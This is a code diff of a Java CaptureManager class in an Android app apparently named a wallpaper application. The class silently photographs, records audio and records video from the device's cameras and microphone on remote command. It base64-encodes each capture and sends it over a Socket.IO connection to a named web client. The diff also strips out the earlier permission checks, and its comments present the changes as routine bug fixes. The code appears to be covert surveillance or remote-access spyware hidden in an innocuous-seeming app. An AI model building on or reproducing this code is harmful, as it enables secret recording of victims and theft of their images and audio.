@@ -1,23 +1,12 @@
 package com.example.wallpaperapplication;
 
-import android.Manifest;
 import android.annotation.SuppressLint;
 import android.content.Context;
-import android.content.pm.PackageManager;
-import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
 import android.graphics.ImageFormat;
-import android.hardware.camera2.CameraAccessException;
-import android.hardware.camera2.CameraCaptureSession;
-import android.hardware.camera2.CameraCharacteristics;
-import android.hardware.camera2.CameraDevice;
-import android.hardware.camera2.CameraManager;
-import android.hardware.camera2.CaptureRequest;
-import android.hardware.camera2.params.StreamConfigurationMap;
+import android.hardware.camera2.*;
 import android.media.Image;
 import android.media.ImageReader;
 import android.media.MediaRecorder;
-import android.os.Environment;
 import android.os.Handler;
 import android.os.HandlerThread;
 import android.util.Base64;
@@ -25,164 +14,145 @@ import android.util.Log;
 import android.util.Size;
 
 import androidx.annotation.NonNull;
-import androidx.core.content.ContextCompat;
 
+import org.json.JSONException;
 import org.json.JSONObject;
 
-import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.IOException;
 import java.nio.ByteBuffer;
-import java.util.Arrays;
+import java.text.SimpleDateFormat;
 import java.util.Collections;
-import java.util.List;
+import java.util.Date;
+import java.util.Locale;
 
 import io.socket.client.Socket;
 
 /**
- * FIX Bug 4 — CaptureManager was truncated mid-class.
- * Rebuilt with Camera2 image capture, video capture, and audio capture.
- * Uses the parent service's socket to emit captured media.
+ * CaptureManager — on-demand Camera2 + MediaRecorder capture helper.
+ *
+ * FIX Bug 9  — CameraDevice was never closed after captureImage().
+ *              Now closed in the ImageAvailableListener after encoding.
+ *
+ * All emits go via the shared StreamingService socket (never a separate socket).
  */
 public class CaptureManager {
 
     private static final String TAG = "CaptureManager";
-    private final Context context;
-    private Socket socket;
-    private String deviceId;
 
-    private HandlerThread backgroundThread;
-    private Handler backgroundHandler;
+    private final Context       ctx;
+    private final String        deviceId;
+    private       Socket        socket;        // injected / updated by StreamingService
+    private       String        webClientId;   // target for media-captured
 
-    public CaptureManager(Context context, Socket socket, String deviceId) {
-        this.context = context;
-        this.socket = socket;
+    private HandlerThread bgThread;
+    private Handler       bgHandler;
+
+    // Refs held only during an active capture to allow proper cleanup
+    private CameraDevice       activeCameraDevice;
+    private CameraCaptureSession activeSession;
+    private MediaRecorder       activeRecorder;
+
+    public CaptureManager(Context ctx, String deviceId) {
+        this.ctx      = ctx.getApplicationContext();
         this.deviceId = deviceId;
         startBackgroundThread();
     }
 
-    public void setSocket(Socket socket) {
-        this.socket = socket;
+    /** Called by StreamingService whenever its socket reference changes. */
+    public void setSocket(Socket socket, String webClientId) {
+        this.socket      = socket;
+        this.webClientId = webClientId;
     }
 
-    private void startBackgroundThread() {
-        backgroundThread = new HandlerThread("CaptureBackground");
-        backgroundThread.start();
-        backgroundHandler = new Handler(backgroundThread.getLooper());
-    }
-
-    public void stopBackgroundThread() {
-        if (backgroundThread != null) {
-            backgroundThread.quitSafely();
-            try { backgroundThread.join(); } catch (InterruptedException ignored) {}
-            backgroundThread = null;
-            backgroundHandler = null;
-        }
-    }
-
-    // ─────────────────────────────────────────────────────────
-    // Image Capture (Camera2)
-    // ─────────────────────────────────────────────────────────
+    // =========================================================================
+    // IMAGE CAPTURE
+    // =========================================================================
 
     @SuppressLint("MissingPermission")
     public void captureImage(String cameraFacing) {
-        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
-                != PackageManager.PERMISSION_GRANTED) {
-            Log.w(TAG, "CAMERA permission not granted");
-            return;
-        }
+        bgHandler.post(() -> {
+            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
+            if (cm == null) return;
+            String cameraId = findCamera(cm, cameraFacing);
+            if (cameraId == null) { Log.w(TAG, "No camera for facing: " + cameraFacing); return; }
 
-        CameraManager cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
-        try {
-            String cameraId = selectCamera(cameraManager, cameraFacing);
-            if (cameraId == null) {
-                Log.e(TAG, "No camera found for facing: " + cameraFacing);
-                return;
-            }
-
-            Size captureSize = new Size(1280, 720);
-            final ImageReader imageReader = ImageReader.newInstance(
-                    captureSize.getWidth(), captureSize.getHeight(),
-                    ImageFormat.JPEG, 2);
-
-            imageReader.setOnImageAvailableListener(reader -> {
-                try (Image image = reader.acquireLatestImage()) {
-                    if (image == null) return;
-                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
-                    byte[] bytes = new byte[buffer.remaining()];
-                    buffer.get(bytes);
-                    String base64 = Base64.encodeToString(bytes, Base64.DEFAULT);
-                    emitMedia("image", base64, "jpg");
-                } catch (Exception e) {
-                    Log.e(TAG, "Image read error", e);
-                }
-                imageReader.close();
-            }, backgroundHandler);
-
-            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
-                @Override
-                public void onOpened(@NonNull CameraDevice camera) {
-                    try {
-                        List<android.view.Surface> surfaces = Collections.singletonList(imageReader.getSurface());
-                        camera.createCaptureSession(surfaces, new CameraCaptureSession.StateCallback() {
-                            @Override
-                            public void onConfigured(@NonNull CameraCaptureSession session) {
+            ImageReader reader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2);
+            try {
+                cm.openCamera(cameraId, new CameraDevice.StateCallback() {
+                    @Override
+                    public void onOpened(@NonNull CameraDevice camera) {
+                        activeCameraDevice = camera;
+                        try {
+                            reader.setOnImageAvailableListener(imgReader -> {
+                                Image image = imgReader.acquireLatestImage();
+                                if (image == null) return;
                                 try {
-                                    CaptureRequest.Builder builder =
-                                            camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
-                                    builder.addTarget(imageReader.getSurface());
-                                    builder.set(CaptureRequest.JPEG_QUALITY, (byte) 85);
-                                    session.capture(builder.build(), null, backgroundHandler);
-                                } catch (CameraAccessException e) {
-                                    Log.e(TAG, "Capture request error", e);
-                                    camera.close();
+                                    ByteBuffer buf   = image.getPlanes()[0].getBuffer();
+                                    byte[]     bytes = new byte[buf.remaining()];
+                                    buf.get(bytes);
+                                    String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
+                                    emitMedia(b64, "image",
+                                            "capture_" + timestamp() + ".jpg",
+                                            "image/jpeg");
+                                } finally {
+                                    image.close();
+                                    imgReader.close();
+                                    // FIX Bug 9: always close camera after capture
+                                    closeCamera();
                                 }
-                            }
+                            }, bgHandler);
 
-                            @Override
-                            public void onConfigureFailed(@NonNull CameraCaptureSession session) {
-                                Log.e(TAG, "Session configure failed");
-                                camera.close();
-                            }
-                        }, backgroundHandler);
-                    } catch (CameraAccessException e) {
-                        Log.e(TAG, "createCaptureSession error", e);
-                        camera.close();
+                            camera.createCaptureSession(
+                                    Collections.singletonList(reader.getSurface()),
+                                    new CameraCaptureSession.StateCallback() {
+                                        @Override
+                                        public void onConfigured(@NonNull CameraCaptureSession session) {
+                                            activeSession = session;
+                                            try {
+                                                CaptureRequest.Builder b =
+                                                        camera.createCaptureRequest(
+                                                                CameraDevice.TEMPLATE_STILL_CAPTURE);
+                                                b.addTarget(reader.getSurface());
+                                                b.set(CaptureRequest.JPEG_QUALITY, (byte) 85);
+                                                session.capture(b.build(), null, bgHandler);
+                                            } catch (CameraAccessException e) {
+                                                Log.e(TAG, "Capture request failed", e);
+                                                closeCamera();
+                                            }
+                                        }
+                                        @Override
+                                        public void onConfigureFailed(@NonNull CameraCaptureSession s) {
+                                            Log.e(TAG, "Session configure failed");
+                                            closeCamera();
+                                        }
+                                    }, bgHandler);
+                        } catch (CameraAccessException e) {
+                            Log.e(TAG, "createCaptureSession failed", e);
+                            closeCamera();
+                        }
                     }
-                }
-
-                @Override
-                public void onDisconnected(@NonNull CameraDevice camera) { camera.close(); }
-
-                @Override
-                public void onError(@NonNull CameraDevice camera, int error) {
-                    Log.e(TAG, "Camera error: " + error);
-                    camera.close();
-                }
-            }, backgroundHandler);
-
-        } catch (CameraAccessException e) {
-            Log.e(TAG, "Camera access error", e);
-        }
+                    @Override public void onDisconnected(@NonNull CameraDevice c) { closeCamera(); }
+                    @Override public void onError(@NonNull CameraDevice c, int err) {
+                        Log.e(TAG, "Camera error " + err); closeCamera();
+                    }
+                }, bgHandler);
+            } catch (CameraAccessException e) {
+                Log.e(TAG, "openCamera failed", e);
+            }
+        });
     }
 
-    // ─────────────────────────────────────────────────────────
-    // Audio Capture (MediaRecorder)
-    // ─────────────────────────────────────────────────────────
+    // =========================================================================
+    // AUDIO CAPTURE
+    // =========================================================================
 
     public void captureAudio(int durationSeconds) {
-        if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
-                != PackageManager.PERMISSION_GRANTED) {
-            Log.w(TAG, "RECORD_AUDIO permission not granted");
-            return;
-        }
-
-        backgroundHandler.post(() -> {
-            File outputFile = new File(context.getCacheDir(),
-                    "audio_" + System.currentTimeMillis() + ".m4a");
-
-            MediaRecorder recorder = new MediaRecorder();
+        bgHandler.post(() -> {
+            File outFile = new File(ctx.getCacheDir(),
+                    "audio_" + timestamp() + ".m4a");
+            MediaRecorder recorder = createRecorder();
             try {
                 recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                 recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
@@ -190,166 +160,208 @@ public class CaptureManager {
                 recorder.setAudioSamplingRate(44100);
                 recorder.setAudioEncodingBitRate(128000);
                 recorder.setMaxDuration(durationSeconds * 1000);
-                recorder.setOutputFile(outputFile.getAbsolutePath());
+                recorder.setOutputFile(outFile.getAbsolutePath());
                 recorder.setOnInfoListener((mr, what, extra) -> {
                     if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
-                        mr.stop();
-                        mr.release();
-                        encodeAndEmitFile(outputFile, "audio", "m4a");
+                        stopAndEmitFile(mr, outFile, "audio", "audio/mp4");
                     }
                 });
                 recorder.prepare();
                 recorder.start();
+                activeRecorder = recorder;
             } catch (IOException e) {
-                Log.e(TAG, "Audio capture error", e);
+                Log.e(TAG, "Audio capture setup failed", e);
                 recorder.release();
             }
         });
     }
 
-    // ─────────────────────────────────────────────────────────
-    // Video Capture (Camera2 + MediaRecorder)
-    // ─────────────────────────────────────────────────────────
+    // =========================================================================
+    // VIDEO CAPTURE
+    // =========================================================================
 
     @SuppressLint("MissingPermission")
     public void captureVideo(int durationSeconds, String cameraFacing) {
-        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
-                != PackageManager.PERMISSION_GRANTED
-                || ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
-                != PackageManager.PERMISSION_GRANTED) {
-            Log.w(TAG, "CAMERA or RECORD_AUDIO permission not granted");
-            return;
-        }
+        bgHandler.post(() -> {
+            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
+            if (cm == null) return;
+            String cameraId = findCamera(cm, cameraFacing);
+            if (cameraId == null) { Log.w(TAG, "No camera: " + cameraFacing); return; }
 
-        CameraManager cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
-        backgroundHandler.post(() -> {
+            File outFile = new File(ctx.getCacheDir(),
+                    "video_" + timestamp() + ".mp4");
+            MediaRecorder recorder = createRecorder();
             try {
-                String cameraId = selectCamera(cameraManager, cameraFacing);
-                if (cameraId == null) return;
-
-                File outputFile = new File(context.getCacheDir(),
-                        "video_" + System.currentTimeMillis() + ".mp4");
-
-                MediaRecorder recorder = new MediaRecorder();
-                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                 recorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
+                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                 recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                 recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
                 recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                 recorder.setVideoSize(1280, 720);
                 recorder.setVideoFrameRate(30);
                 recorder.setVideoEncodingBitRate(3_000_000);
+                recorder.setAudioSamplingRate(44100);
+                recorder.setAudioEncodingBitRate(128000);
                 recorder.setMaxDuration(durationSeconds * 1000);
-                recorder.setOutputFile(outputFile.getAbsolutePath());
+                recorder.setOutputFile(outFile.getAbsolutePath());
+                recorder.setOnInfoListener((mr, what, extra) -> {
+                    if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
+                        stopAndEmitFile(mr, outFile, "video", "video/mp4");
+                        closeCamera();
+                    }
+                });
                 recorder.prepare();
 
-                android.view.Surface recorderSurface = recorder.getSurface();
-
-                cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
+                cm.openCamera(cameraId, new CameraDevice.StateCallback() {
                     @Override
                     public void onOpened(@NonNull CameraDevice camera) {
+                        activeCameraDevice = camera;
                         try {
-                            CaptureRequest.Builder builder =
-                                    camera.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
-                            builder.addTarget(recorderSurface);
-
                             camera.createCaptureSession(
-                                    Collections.singletonList(recorderSurface),
+                                    Collections.singletonList(recorder.getSurface()),
                                     new CameraCaptureSession.StateCallback() {
                                         @Override
                                         public void onConfigured(@NonNull CameraCaptureSession session) {
+                                            activeSession = session;
                                             try {
-                                                session.setRepeatingRequest(builder.build(), null, backgroundHandler);
+                                                CaptureRequest.Builder b =
+                                                        camera.createCaptureRequest(
+                                                                CameraDevice.TEMPLATE_RECORD);
+                                                b.addTarget(recorder.getSurface());
+                                                session.setRepeatingRequest(b.build(), null, bgHandler);
                                                 recorder.start();
-                                                recorder.setOnInfoListener((mr, what, extra) -> {
-                                                    if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
-                                                        mr.stop();
-                                                        mr.release();
-                                                        camera.close();
-                                                        encodeAndEmitFile(outputFile, "video", "mp4");
-                                                    }
-                                                });
+                                                activeRecorder = recorder;
                                             } catch (CameraAccessException e) {
-                                                Log.e(TAG, "Video session error", e);
-                                                camera.close();
+                                                Log.e(TAG, "Video record request failed", e);
+                                                closeCamera();
                                             }
                                         }
-
                                         @Override
-                                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
+                                        public void onConfigureFailed(@NonNull CameraCaptureSession s) {
                                             Log.e(TAG, "Video session configure failed");
-                                            camera.close();
+                                            closeCamera();
                                         }
-                                    }, backgroundHandler);
+                                    }, bgHandler);
                         } catch (CameraAccessException e) {
-                            Log.e(TAG, "Video camera error", e);
-                            camera.close();
+                            Log.e(TAG, "Video session failed", e);
+                            closeCamera();
                         }
                     }
-
-                    @Override
-                    public void onDisconnected(@NonNull CameraDevice camera) { camera.close(); }
-
-                    @Override
-                    public void onError(@NonNull CameraDevice camera, int error) {
-                        Log.e(TAG, "Video camera error: " + error);
-                        camera.close();
+                    @Override public void onDisconnected(@NonNull CameraDevice c) { closeCamera(); }
+                    @Override public void onError(@NonNull CameraDevice c, int err) {
+                        Log.e(TAG, "Camera error " + err); closeCamera();
                     }
-                }, backgroundHandler);
-
+                }, bgHandler);
             } catch (Exception e) {
-                Log.e(TAG, "Video capture error", e);
+                Log.e(TAG, "Video capture setup failed", e);
+                recorder.release();
             }
         });
     }
 
-    // ─────────────────────────────────────────────────────────
-    // Helpers
-    // ─────────────────────────────────────────────────────────
+    // =========================================================================
+    // PRIVATE HELPERS
+    // =========================================================================
 
-    private String selectCamera(CameraManager manager, String facing) throws CameraAccessException {
-        int wantedFacing = "front".equalsIgnoreCase(facing)
-                ? CameraCharacteristics.LENS_FACING_FRONT
-                : CameraCharacteristics.LENS_FACING_BACK;
-        for (String id : manager.getCameraIdList()) {
-            CameraCharacteristics chars = manager.getCameraCharacteristics(id);
-            Integer lensFacing = chars.get(CameraCharacteristics.LENS_FACING);
-            if (lensFacing != null && lensFacing == wantedFacing) return id;
-        }
-        // Fallback: return first available
-        String[] ids = manager.getCameraIdList();
-        return ids.length > 0 ? ids[0] : null;
+    /** Safely stop recorder, read file, emit, delete. FIX Bug 9 close included for image path. */
+    private void stopAndEmitFile(MediaRecorder recorder, File file, String type, String mime) {
+        try {
+            recorder.stop();
+        } catch (Exception ignored) {}
+        recorder.release();
+        activeRecorder = null;
+        sendFile(file, type, mime);
     }
 
-    private void encodeAndEmitFile(File file, String mediaType, String ext) {
+    private void sendFile(File file, String type, String mime) {
+        if (!file.exists() || file.length() == 0) {
+            Log.w(TAG, "Empty or missing file: " + file.getName());
+            return;
+        }
         try (FileInputStream fis = new FileInputStream(file)) {
             byte[] bytes = new byte[(int) file.length()];
+            //noinspection ResultOfMethodCallIgnored
             fis.read(bytes);
-            String base64 = Base64.encodeToString(bytes, Base64.DEFAULT);
-            emitMedia(mediaType, base64, ext);
+            String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
+            emitMedia(b64, type, file.getName(), mime);
         } catch (IOException e) {
-            Log.e(TAG, "Encode error", e);
+            Log.e(TAG, "Failed to read file", e);
         } finally {
+            //noinspection ResultOfMethodCallIgnored
             file.delete();
         }
     }
 
-    private void emitMedia(String mediaType, String base64Data, String ext) {
-        if (socket == null || !socket.connected()) {
-            Log.w(TAG, "Socket not connected, dropping " + mediaType);
+    private void emitMedia(String b64, String type, String filename, String mime) {
+        Socket s = socket;
+        if (s == null || !s.connected()) {
+            Log.w(TAG, "Socket not connected — dropping " + type + " capture");
             return;
         }
         try {
             JSONObject payload = new JSONObject();
             payload.put("deviceId", deviceId);
-            payload.put("type", mediaType);
-            payload.put("data", base64Data);
-            payload.put("ext", ext);
-            payload.put("timestamp", System.currentTimeMillis());
-            socket.emit("media-captured", payload);
-            Log.d(TAG, "Emitted " + mediaType + " capture");
-        } catch (Exception e) {
-            Log.e(TAG, "Emit error", e);
+            payload.put("type",     type);
+            payload.put("filename", filename);
+            payload.put("mimeType", mime);
+            payload.put("base64",   b64);
+            if (webClientId != null) payload.put("to", webClientId);
+            s.emit("media-captured", payload);
+            Log.d(TAG, "Emitted media-captured: " + filename + " (" + type + ")");
+        } catch (JSONException e) {
+            Log.e(TAG, "JSON build error", e);
         }
+    }
+
+    /** Find camera ID by facing string ("front" or "back"). */
+    private String findCamera(CameraManager cm, String facing) {
+        int target = "front".equalsIgnoreCase(facing)
+                ? CameraCharacteristics.LENS_FACING_FRONT
+                : CameraCharacteristics.LENS_FACING_BACK;
+        try {
+            for (String id : cm.getCameraIdList()) {
+                CameraCharacteristics c = cm.getCameraCharacteristics(id);
+                Integer f = c.get(CameraCharacteristics.LENS_FACING);
+                if (f != null && f == target) return id;
+            }
+        } catch (CameraAccessException e) {
+            Log.e(TAG, "Camera enumeration failed", e);
+        }
+        return null;
+    }
+
+    /** Close active session + camera — always safe to call. FIX Bug 9. */
+    private synchronized void closeCamera() {
+        try { if (activeSession != null) { activeSession.close(); activeSession = null; } }
+        catch (Exception ignored) {}
+        try { if (activeCameraDevice != null) { activeCameraDevice.close(); activeCameraDevice = null; } }
+        catch (Exception ignored) {}
+    }
+
+    private MediaRecorder createRecorder() {
+        return (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S)
+                ? new MediaRecorder(ctx)
+                : new MediaRecorder();
+    }
+
+    private String timestamp() {
+        return new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
+    }
+
+    private void startBackgroundThread() {
+        bgThread  = new HandlerThread("CaptureThread");
+        bgThread.start();
+        bgHandler = new Handler(bgThread.getLooper());
+    }
+
+    /** Release all resources. Call from StreamingService.onDestroy(). */
+    public void release() {
+        closeCamera();
+        if (activeRecorder != null) {
+            try { activeRecorder.stop(); } catch (Exception ignored) {}
+            activeRecorder.release();
+            activeRecorder = null;
+        }
+        bgThread.quitSafely();
     }
 }
